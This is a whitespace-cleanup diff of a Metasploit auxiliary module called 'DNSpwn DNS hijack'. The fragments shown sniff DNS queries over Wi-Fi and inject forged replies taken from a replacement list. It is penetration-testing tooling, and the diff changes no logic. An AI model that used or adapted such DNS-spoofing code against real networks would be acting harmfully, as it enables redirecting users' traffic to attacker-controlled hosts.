@@ -3,7 +3,7 @@
 ##
 
 ##
-# This file is part of the Metasploit Framework and may be subject to 
+# This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
 # http://metasploit.com/framework/
@@ -18,7 +18,7 @@ class Metasploit3 < Msf::Auxiliary
 
 	include Msf::Exploit::Lorcon2
 	include Msf::Auxiliary::Report
-	
+
 	def initialize
 		super(
 			'Name'        => 'DNSpwn DNS hijack',
@@ -33,7 +33,7 @@ class Metasploit3 < Msf::Auxiliary
 		register_options(
 			[
 				OptPath.new('DNSLIST',	  [ false, "YAML file of DNS entries for replacement",
-						File.join(Msf::Config.install_root, "data", "exploits", "wifi", "dnspwn", "dnslist.yml") 
+						File.join(Msf::Config.install_root, "data", "exploits", "wifi", "dnspwn", "dnslist.yml")
 					]),
 				OptBool.new('USEDNSFILE', [ true, "Use dns list file for response", "false"]),
 				OptString.new('FILTER',	  [ true, "Default BPF filter", "port 53"]),
@@ -89,7 +89,7 @@ class Metasploit3 < Msf::Auxiliary
 
 			@dns.each do |r|
 				hit = nil
-				r['regex'].each do |reg| 
+				r['regex'].each do |reg|
 					hit = dns.question[0].qName.scan(/#{reg}/) || nil
 					break if hit.size != 0
 				end
@@ -132,7 +132,7 @@ class Metasploit3 < Msf::Auxiliary
 					injpkt.direction = Lorcon::Packet::LORCON_ADHOC_DS
 				end
 
-				self.wifi.inject(injpkt) or print_status("DNSPWN failed to inject packet: " + tx.error) 
+				self.wifi.inject(injpkt) or print_status("DNSPWN failed to inject packet: " + tx.error)
 			end
 		end
 	end
